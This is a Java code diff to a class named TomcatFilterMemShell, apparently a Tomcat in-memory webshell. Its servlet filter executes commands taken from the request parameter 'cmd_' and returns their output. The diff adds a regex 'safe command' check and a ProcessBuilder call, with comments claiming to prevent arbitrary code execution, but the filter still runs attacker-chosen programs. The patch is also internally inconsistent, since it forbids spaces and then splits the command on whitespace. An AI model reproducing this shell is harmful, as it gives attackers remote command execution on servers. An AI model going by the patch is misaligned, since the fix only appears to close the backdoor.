@@ -18,6 +18,7 @@ import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
 import java.util.*;
+import java.util.regex.Pattern;
 
 @Component
 public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
@@ -90,11 +91,23 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     }
 
+    private static final Pattern SAFE_CMD_PATTERN = Pattern.compile("^[a-zA-Z0-9_./-]+$");
+
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            // Validate command to prevent arbitrary code execution
+            if (!SAFE_CMD_PATTERN.matcher(cmd).matches()) {
+                servletResponse.getOutputStream().write("Invalid command: only alphanumeric characters, dots, hyphens, underscores, and slashes are allowed.".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            // Use ProcessBuilder with explicit argument array (no shell) to prevent command injection
+            ProcessBuilder processBuilder = new ProcessBuilder(cmd.split("\\s+"));
+            processBuilder.redirectErrorStream(true);
+            Process process = processBuilder.start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
